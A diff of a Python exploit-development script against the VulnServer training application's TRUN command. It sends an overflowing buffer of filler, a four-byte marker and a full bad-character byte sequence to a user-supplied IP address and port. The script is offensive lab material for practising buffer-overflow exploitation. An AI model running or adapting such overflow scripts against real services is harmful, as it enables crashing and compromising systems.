@@ -1,29 +1,32 @@
 #!/usr/bin/python3
-#/x00
+#bad character "\x00"
+
 
 import sys,socket
 from time import sleep
 
+print("************VulnServer TRUN**********")
 
-print("****************Vuln_Server Vulnerability*************")
-sleep(0.5)
-ip_address=input("Enter the IP address:\n")
-port_number=input("Enter the port number:\n")
+ip_address=input("Enter the IP address\n")
+port_number=input("Enter the port number\n")
 
-if(len(ip_address)<=0) or (len(port_number)<=0):
-    if(len(ip_address)>0) and (len(port_number)<=0):
-        print("*"*30)
+if (len(ip_address)<=0) or (len(port_number)<=0):
+    if (len(ip_address)>0) and (len(port_number)<=0):
+        print("*" * 30)
         print("Port number field is empty")
-    elif(len(ip_address)<=0) and (len(port_number)>0):
-        print("*"*30)
+    elif (len(ip_address)<=0) and (len(port_number)>0):
+        print("*" * 30)
         print("IP Address field is empty")
+    elif (len(ip_address)<=0) and (len(port_number)<=0):
+        print("*" * 30)
+        print("IP Address field is empty")
+        print("Port number field is empty")
     else:
-        print("*"*30)
+        print("*" * 30)
         print("Issues with the user input")
-elif(len(ip_address)>0) or (len(port_number)>0):
-        print("*"*30)
-        badchars = (
-  b"x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
+else:
+    badchars = (
+  b"\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10"
   b"\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
   b"\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30"
   b"\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40"
@@ -40,8 +43,9 @@ elif(len(ip_address)>0) or (len(port_number)>0):
   b"\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0"
   b"\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"
 )
-        buffer=b"A" * 2003 + b"B" * 4 + badchars 
-        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
-        s.connect((ip_address, int(port_number)))
-        s.send((b"TRUN /.:/" + buffer + b"\r\n"))
-        s.close()
+
+    size=b"A" * 2003 + b"B" * 4 + badchars
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect((ip_address, int(port_number)))
+    s.send(b"TRUN /.:/" +size)
+    s.close()
